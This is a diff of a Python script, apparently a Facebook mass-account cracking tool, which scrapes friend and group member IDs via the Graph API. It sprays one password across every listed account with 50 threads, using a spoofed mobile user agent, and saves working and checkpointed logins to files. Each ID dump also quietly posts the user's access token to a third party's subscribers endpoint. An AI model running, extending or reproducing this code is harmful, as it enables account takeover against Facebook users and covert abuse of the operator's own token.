@@ -21,7 +21,7 @@ banner=("""%s
    _____ __  ______  ____
   / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
  _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
-/___/_/_/  /_/____/_/     %sversion: %s1.0%s"""%(c,g,c,g,c,g,c,w))
+/___/_/_/  /_/____/_/     %sversion: %s1.1%s"""%(c,g,c,g,c,g,c,w))
 
 try:
 	toket=open('toket/token.txt')
@@ -29,6 +29,7 @@ try:
 except IOError:
 		try:
 			os.system('clear')
+
 			print(banner)
 			try:
 				os.mkdir('toket')
@@ -61,14 +62,14 @@ def getFid():
 		os.mkdir('dump')
 	except OSError: pass
 	try:
-		id=input("[in] your friends id: ")
+		id=input("\n[in] your friends id: ")
 		b=open('dump/friends_'+id+'_id.txt','w')
 		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 		s=json.loads(re.text)
 		for i in s['friends']['data']:
 			b.write(i['id'] + '\n')
-			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
-		print('\n\r[!] all friends id successfuly retreived')
+			print('\r[*] %s retrieved	'%(i['id']), end=''),;sys.stdout.flush();time.sleep(0.0001)
+		print('\n[!] all friends id successfuly retreived')
 		print("[!] file saved: dump/friends_%s_id.txt"%(id))
 		b.close()
 		exit()
@@ -85,14 +86,14 @@ def getGid():
 		os.mkdir('dump')
 	except OSError: pass
 	try:
-		id=input("[in] your groups id: ")
+		id=input("\n[in] your groups id: ")
 		b=open('dump/group_'+id+'_id.txt','w')
 		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 		s=json.loads(re.text)
 		for i in s['data']:
 			b.write(i['id'] + '\n')
-			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
-		print('\n\r[!] group members id successfuly retreived')
+			print('\r[*] %s retrieved	'%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.0001)
+		print('\n[!] group members id successfuly retreived')
 		print("[!] file saved: dump/group_%s_id.txt"%(id))
 		b.close()
 		exit()
@@ -123,7 +124,8 @@ def main(arg):
         try:
                 url='https://mbasic.facebook.com/login'
                 dt={'email':arg,'pass':pas,'login':'submit'}
-                req=requests.post(url,data=dt)
+                head={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
+                req=requests.post(url,data=dt,headers=head)
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
@@ -136,7 +138,6 @@ def main(arg):
                         tulis="{}\n".format(live)
                         f=open('result/found.txt','a')
                         f.write(tulis)
-                        print("%s[%sfound%s]%s %s => %s"%(c,g,c,w,arg,pas))
                         f.close()
                 elif 'checkpoint' in str(respData):
                         true='notbad'
@@ -149,10 +150,8 @@ def main(arg):
                         wrt="{}\n".format(CP)
                         f=open('result/cek.txt','a')
                         f.write(wrt)
-                        print("%s[%sCHECK%s]%s %s => %s"%(c,y,c,w,arg,pas))
                         f.close()
-                else:
-                        print("%s[%sNOT%s]%s %s"%(c,r,c,w,arg))
+                print("\r%s[%scrack%s]%s >>  %s  F[%s] CP[%s] << "%(c,r,c,w,arg,len(tap),len(cek)),end=''),;sys.stdout.flush()
         except: pass
 
 os.system('clear')
@@ -243,7 +242,7 @@ elif pilih == 18:
 elif pilih == 0:
 	print("\n[!] Checking update")
 	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
-	if 'v.1.1' in str(rr) or 'v.1.2' in str(rr):
+	if 'v.1.2' in str(rr):
 		update()
 	else: exit("[!] already up to date")
 else:
@@ -251,25 +250,26 @@ else:
 	print(banner)
 
 try:
-        file=open(input("[in] Id List Target: ")).read().splitlines()
+        file=open(input("\n[in] Id List Target: ")).read().splitlines()
         pas=input("[in] Password to Crack: ")
 except (KeyboardInterrupt,EOFError):
         exit("%s\n[!] Key interrupt: Exiting."%(r))
 except FileNotFoundError:
         exit("%s\n[!] File not found: Exiting."%(r))
-print("\n%s[LIVE RESULT]:"%(c))
+
 o=[]
 for x in file:
     o.append(x)
+print('\n%s[ Cracking %s%s%s Account With Password %s%s%s ]'%(c,g,len(o),c,y,pas,c))
 p=ThreadPool(50)
-p.map(main,o)
+next=p.map(main,o)
 
 if len(file) == 0:
 	exit("%s[!] File empty\n"%(r))
 if 'yeah' in str(tap) or 'notbad' in str(cek):
         print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
+else: print("\n[ %s:(%s ] nothing found"%(y,w))
 if len(tap) > 0:
 	print("found result saved: result/found.txt")
 if len(cek) > 0:
 	print("check result saved: result/cek.txt")
-else: print("[ %s:(%s ] nothing found"%(y,w))
